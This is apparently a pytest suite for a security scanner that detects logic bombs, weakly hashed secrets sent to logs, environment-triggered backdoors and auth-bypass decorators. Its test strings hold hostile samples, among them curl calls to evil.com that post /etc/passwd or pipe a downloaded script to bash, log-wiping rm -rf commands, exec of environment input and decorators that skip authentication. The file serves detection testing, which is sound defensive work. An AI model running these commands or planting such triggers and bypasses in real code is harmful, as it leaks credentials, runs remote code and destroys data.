"""
Logic Bomb Detection Test Suite

Tests the AI Auditor's ability to detect advanced attack patterns:
- Washed Secrets (MD5/SHA1 hashing before logging)
- Hidden State Logic (environmental triggers)
- Insecure Decorators (auth bypass)
- Time-based Logic Bombs

Run with: pytest tests/test_logic_bomb_detection.py -v
"""

import pytest
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from security_py.core import SecurityValidator, ScanEngine, TaintVisitor
from security_py.types.violations import ScanContext, Severity


@pytest.fixture
def context():
    return ScanContext(
        project_path="/test",
        phase="TEST",
        developer_id="test-user",
    )


@pytest.fixture
def validator():
    from security_py.core.security_validator import ValidatorConfig
    config = ValidatorConfig(
        exit_on_critical=False,
        enable_persistence=False,
    )
    return SecurityValidator(config)


# =============================================================================
# WASHED SECRETS (Cryptographic Laundering)
# =============================================================================

class TestWashedSecrets:
    """Test detection of secrets hashed with weak algorithms then logged."""
    
    def test_md5_washed_secret_to_log(self, validator, context):
        """MD5 hash of secret logged = CRITICAL (rainbow table attack)."""
        code = '''
import hashlib
import os
import logging

api_key = os.environ.get("API_KEY")
hashed = hashlib.md5(api_key.encode()).hexdigest()
logging.info(f"Request with key hash: {hashed}")
'''
        result = validator.validate_content(code, context, "washed_md5.py")
        # Should detect the taint flow from env → md5 → logging
        assert len(result.violations) > 0
    
    def test_sha1_washed_secret_to_print(self, validator, context):
        """SHA1 hash of secret printed = CRITICAL."""
        code = '''
import hashlib
import os

password = os.environ.get("DB_PASSWORD")
weak_hash = hashlib.sha1(password.encode()).hexdigest()
print(f"Password hash for debug: {weak_hash}")
'''
        result = validator.validate_content(code, context, "washed_sha1.py")
        assert len(result.violations) > 0
    
    def test_sha256_is_acceptable(self, validator, context):
        """SHA256 is acceptable for hashing (but logging hash is still suspicious)."""
        code = '''
import hashlib
import os

token = os.environ.get("AUTH_TOKEN")
secure_hash = hashlib.sha256(token.encode()).hexdigest()
# Not logging it - just using for comparison
if secure_hash == stored_hash:
    grant_access()
'''
        result = validator.validate_content(code, context, "sha256_ok.py")
        # Should have fewer/no violations for sha256 not logged
        critical = [v for v in result.violations if v.severity == Severity.CRITICAL]
        assert len(critical) == 0


# =============================================================================
# HIDDEN STATE LOGIC (Environmental Triggers)
# =============================================================================

class TestHiddenStateLogic:
    """Test detection of code that triggers only under specific conditions."""
    
    def test_user_based_trigger(self, validator, context):
        """Code that only runs for specific users = HIDDEN_STATE."""
        code = '''
import os
import subprocess

if os.getlogin() == 'admin':
    subprocess.run(['curl', 'evil.com/exfil', '-d', open('/etc/passwd').read()])
'''
        result = validator.validate_content(code, context, "user_trigger.py")
        # Should detect dangerous subprocess + getlogin trigger
        assert len(result.violations) > 0
        assert any(v.severity == Severity.CRITICAL for v in result.violations)
    
    def test_hostname_based_trigger(self, validator, context):
        """Code that only runs on specific hosts = HIDDEN_STATE."""
        code = '''
import socket
import os

if socket.gethostname() == 'prod-server-1':
    os.system('rm -rf /var/log/*')
'''
        result = validator.validate_content(code, context, "hostname_trigger.py")
        assert len(result.violations) > 0
    
    def test_env_var_backdoor(self, validator, context):
        """Environment variable enables dangerous behavior."""
        code = '''
import os

if os.getenv('DEBUG_MODE') == 'UNSAFE':
    exec(os.getenv('DEBUG_CODE'))
'''
        result = validator.validate_content(code, context, "env_backdoor.py")
        # Should detect exec() with environment input
        assert len(result.violations) > 0


# =============================================================================
# TIME-BASED LOGIC BOMBS
# =============================================================================

class TestTimeBomb:
    """Test detection of time-delayed malicious code."""
    
    def test_future_date_trigger(self, validator, context):
        """Code that triggers after a specific date = LOGIC_BOMB."""
        code = '''
from datetime import datetime
import os

if datetime.now() > datetime(2026, 12, 31):
    os.system("curl evil.com/payload.sh | bash")
'''
        result = validator.validate_content(code, context, "time_bomb.py")
        assert len(result.violations) > 0
    
    def test_random_trigger(self, validator, context):
        """Code that triggers randomly = LOGIC_BOMB."""
        code = '''
import random
import os

if random.random() < 0.01:
    os.system('rm -rf /tmp/evidence/*')
'''
        result = validator.validate_content(code, context, "random_bomb.py")
        assert len(result.violations) > 0


# =============================================================================
# INSECURE DECORATORS
# =============================================================================

class TestInsecureDecorators:
    """Test detection of decorators that bypass security."""
    
    def test_auth_decorator_always_passes(self, validator, context):
        """Auth decorator that always returns True = BROKEN_AUTH."""
        code = '''
def require_admin(func):
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)  # NO AUTH CHECK!
    return wrapper

@require_admin
def delete_all_users():
    db.execute("DELETE FROM users")
'''
        result = validator.validate_content(code, context, "broken_auth.py")
        # Should detect the auth bypass
        assert len(result.violations) > 0
    
    def test_auth_decorator_with_env_bypass(self, validator, context):
        """Auth decorator with environment variable bypass = CRITICAL."""
        code = '''
import os

def authenticate(func):
    def wrapper(*args, **kwargs):
        if os.getenv('SKIP_AUTH'):
            return func(*args, **kwargs)
        # ... actual auth would be here
        return func(*args, **kwargs)
    return wrapper
'''
        result = validator.validate_content(code, context, "auth_bypass.py")
        # Should detect env-based auth bypass
        assert len(result.violations) > 0
    
    def test_error_swallowing_decorator(self, validator, context):
        """Decorator that silently swallows errors = suspicious."""
        code = '''
def safe_call(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except:
            pass  # Errors disappear!
    return wrapper

@safe_call
def transfer_funds(amount):
    process_payment(amount)
'''
        result = validator.validate_content(code, context, "error_swallow.py")
        # Should detect bare except with pass
        assert len(result.violations) > 0


# =============================================================================
# COMPLEX MULTI-LAYER ATTACKS
# =============================================================================

class TestComplexAttacks:
    """Test detection of sophisticated multi-stage attacks."""
    
    def test_washed_secret_with_time_bomb(self, validator, context):
        """Combination: secret washed AND time-delayed leak."""
        code = '''
import hashlib
import os
from datetime import datetime

api_key = os.environ.get("API_KEY")

def delayed_exfil():
    if datetime.now().hour == 3:  # Only at 3 AM
        hashed = hashlib.md5(api_key.encode()).hexdigest()
        with open('/tmp/.cache', 'w') as f:
            f.write(hashed)

delayed_exfil()
'''
        result = validator.validate_content(code, context, "combo_attack.py")
        assert len(result.violations) > 0
    
    def test_decorator_hiding_logic_bomb(self, validator, context):
        """Decorator that hides a logic bomb."""
        code = '''
import os
from datetime import datetime

def innocent_logger(func):
    def wrapper(*args, **kwargs):
        if datetime.now() > datetime(2026, 6, 1):
            os.system('curl evil.com/pwned')
        return func(*args, **kwargs)
    return wrapper

@innocent_logger
def process_order(order_id):
    return db.get_order(order_id)
'''
        result = validator.validate_content(code, context, "hidden_bomb.py")
        assert len(result.violations) > 0


# =============================================================================
# FALSE POSITIVE CHECKS (Clean code that should pass)
# =============================================================================

class TestFalsePositives:
    """Ensure clean code doesn't trigger false positives."""
    
    def test_legitimate_hash_comparison(self, validator, context):
        """Legitimate password hash comparison should be OK."""
        code = '''
import hashlib

def verify_password(password: str, stored_hash: str) -> bool:
    """Verify password against stored hash."""
    computed = hashlib.sha256(password.encode()).hexdigest()
    return computed == stored_hash  # No logging, just comparison
'''
        result = validator.validate_content(code, context, "legit_hash.py")
        critical = [v for v in result.violations if v.severity == Severity.CRITICAL]
        assert len(critical) == 0
    
    def test_legitimate_time_check(self, validator, context):
        """Legitimate time-based logic (business hours) should be OK."""
        code = '''
from datetime import datetime

def is_business_hours() -> bool:
    """Check if current time is during business hours."""
    now = datetime.now()
    return 9 <= now.hour < 17 and now.weekday() < 5
'''
        result = validator.validate_content(code, context, "business_hours.py")
        critical = [v for v in result.violations if v.severity == Severity.CRITICAL]
        assert len(critical) == 0
    
    def test_legitimate_auth_decorator(self, validator, context):
        """Proper auth decorator with actual validation."""
        code = '''
from functools import wraps

def require_auth(func):
    @wraps(func)
    def wrapper(request, *args, **kwargs):
        if not request.user.is_authenticated:
            raise PermissionError("Authentication required")
        return func(request, *args, **kwargs)
    return wrapper
'''
        result = validator.validate_content(code, context, "good_auth.py")
        # Good auth decorator should not be flagged as broken
        broken_auth = [v for v in result.violations if "auth" in v.title.lower()]
        assert len(broken_auth) == 0


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
